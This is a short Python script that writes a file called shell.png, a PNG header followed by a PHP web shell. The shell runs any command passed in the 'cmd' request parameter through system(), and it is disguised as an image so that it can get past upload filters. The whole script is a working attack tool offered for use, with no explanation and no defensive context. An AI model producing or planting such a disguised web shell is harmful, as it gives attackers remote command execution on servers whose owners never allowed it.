#!/usr/bin/env python3

def create_php_shell_png():
    # Simple PHP web shell that will execute when accessed
    php_shell = b'''\x89PNG\r\n\x1a\n<?php
if(isset($_REQUEST['cmd'])) {
    header("Content-Type: text/plain");
    system($_REQUEST['cmd']);
    die();
}
echo "PNG Image";
?>
'''
    
    with open('shell.png', 'wb') as f:
        f.write(php_shell)
    
    print("[+] Created PHP shell as shell.png")

create_php_shell_png()